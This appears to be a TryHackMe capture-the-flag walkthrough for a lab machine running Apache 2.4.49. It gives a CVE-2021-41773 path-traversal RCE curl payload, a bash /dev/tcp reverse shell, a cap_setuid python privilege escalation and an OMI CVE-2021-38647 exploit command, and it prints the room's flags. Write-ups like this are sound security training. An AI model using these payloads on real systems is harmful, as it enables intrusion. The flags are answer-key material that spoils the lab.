# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 80 | http |

```
22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMlfGBGWZkPg98VnvD+FVeesHsQwmtoJfMOMhifMjxD9AEluFQNVnoyxyQi5y9O2/AN/MO+l57li33lHiVjD1eglBjB3Lkzz3tpRJSmGn2Ug3jRypShkSJ9VkUVFElw8MXke62w3+9pi+S0Ub1DqcttGH8TqihiWvqJbJYnecqjdcka1uKPdPna0gleow9JiaAH3X4EMFdcXZDOGgnOaZId2mEXFDeNNYFZpS+EOcLgXaAp1NobUckE9NXvE73qw+pBNo69m3z4MG7/cJNIsQiFpm5yqgCKJGjhwGFp4zAMXOD23lj1g+iQlwrchwY5nBEHHae1PjQwLjwuWebjWR+bWPalPVYa4d8+15TjjgV8VW/Rac3rTX+A/buyVxUSMhkBtn7fQ2sLoMPPn7vRDo3ggGl5IZaYIvSYRDk9nadsZk+YKUCSgFf97z0PK278vbrPwjJTyyScAnjvs+oLnD/bAdja4uwOOS2CHehjzipVmWf7zR3srIfjZQ4aAUmeh8=
| 256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLf6FvNwGNtpra24lyJ4YWPqB8olwPXhKdr6gSW6Dc+oXdZJbQPtpD7cph3nvR9sQQnTKGiG69XyGKh0ervYI1U=
| 256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzBDIQu+cp4gApnTbTbtmqljyAcr/Za8goiY57VM+uq
80/tcp open http syn-ack Apache httpd 2.4.49 ((Unix))
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods:
| Supported Methods: OPTIONS HEAD GET POST TRACE
|_ Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# RECONNAISSANCE
---

As we can see in the scan, the webserver is running `apache 2.4.49`, let's check for an exploit regarding the version. As basic enumeration didn't bring anything useful:


![Pasted image 20250324142059.png](../../IMAGES/Pasted%20image%2020250324142059.png)

We can find `CVE-2021-41773`, it talks about `path traversal and RCE`, let's take a look at it:

Link: https://www.hackthebox.com/blog/cve-2021-41773-explained


![Pasted image 20250324142413.png](../../IMAGES/Pasted%20image%2020250324142413.png)

We get `403` status code, but this does not mean we cannot exploit it, let's try a payload test:

Github: https://github.com/mr-exo/CVE-2021-41773

We can try that payload test and pass it to the proxy to easily modify the request:

```
curl 'http://10.10.240.39/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; id' --proxy http://127.0.0.1:8080
```

![Pasted image 20250324143146.png](../../IMAGES/Pasted%20image%2020250324143146.png)

There we go, we got RCE.




# EXPLOITATION
---

Since we got RCE, we can send ourselves a reverse shell, let's use the following payload:


```
curl 'http://10.10.240.39/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/IP/PORT 0>&1'
```


If we send it, we can see our reverse shell:


![Pasted image 20250324143438.png](../../IMAGES/Pasted%20image%2020250324143438.png)


Let's proceed to privilege escalation.




# PRIVILEGE ESCALATION
---


We can begin by getting our stable shell:


1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. /usr/bin/script -qc /bin/bash /dev/null
3. CTRL + Z
4. stty raw -echo; fg
5. reset xterm
6. export TERM=xterm
7. export BASH=bash

![Pasted image 20250324143608.png](../../IMAGES/Pasted%20image%2020250324143608.png)

There we go, let's start, first, let's check the `/` directory to check if we're in a docker environment:

![Pasted image 20250324143717.png](../../IMAGES/Pasted%20image%2020250324143717.png)

There we go, we are inside of a docker environment, let's check `/etc/hosts`:


![Pasted image 20250324143813.png](../../IMAGES/Pasted%20image%2020250324143813.png)

We can do some basic enumeration on the docker environment:

```
hostname -l # Docker reserve IP pool
arp -a # Docker Gateway 
getcap -r / 2>/dev/null # Capabilities
```

```
daemon@4a70924bafa0:/$ getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
```

We got `python 3.7` with the `cap_setuid` capability, we can exploit this to get root inside the docker environment, let's do this:

```
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

![Pasted image 20250324144612.png](../../IMAGES/Pasted%20image%2020250324144612.png)

We can find the `user.txt` file inside of the root folder:

![Pasted image 20250324144801.png](../../IMAGES/Pasted%20image%2020250324144801.png)

```
root@4a70924bafa0:/# cat /root/user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```

Since we got root, we can scan the machine with nmap, let's get the nmap binary:

Binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

Let's get it in our local machine and start a python server, now, let's get it:

```
curl http://10.6.34.159:8000/nmap -o nmap
```

Now, remember the basic scan from before, we can check the docker gateway:

```
root@4a70924bafa0:/tmp# arp -a
ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1) at 02:42:df:5a:af:69 [ether] on eth0
```

So, we can scan with the following:

```
./nmap 172.17.0.1 -p- --min-rate 5000 
```

![Pasted image 20250324145632.png](../../IMAGES/Pasted%20image%2020250324145632.png)

Ports `5985` and `5986` are enabled, since `5985` is closed, we can check for some info regarding the other one:

![Pasted image 20250324145844.png](../../IMAGES/Pasted%20image%2020250324145844.png)

We are dealing with OMI, let's search for an exploit:

![Pasted image 20250324145908.png](../../IMAGES/Pasted%20image%2020250324145908.png)


Let's download the exploit and test the PoC:

![Pasted image 20250324150038.png](../../IMAGES/Pasted%20image%2020250324150038.png)

There we go, we got the RCE, with this exploit I couldn't do anything more useful so I tried with this one:

Link: https://github.com/AlteredSecurity/CVE-2021-38647/blob/main/CVE-2021-38647.py

```
python3 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
```

![Pasted image 20250324150946.png](../../IMAGES/Pasted%20image%2020250324150946.png)

We got the root flag:

```
python3 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
THM{7f147ef1f36da9ae29529890a1b6011f}
```

![Pasted image 20250324151021.png](../../IMAGES/Pasted%20image%2020250324151021.png)


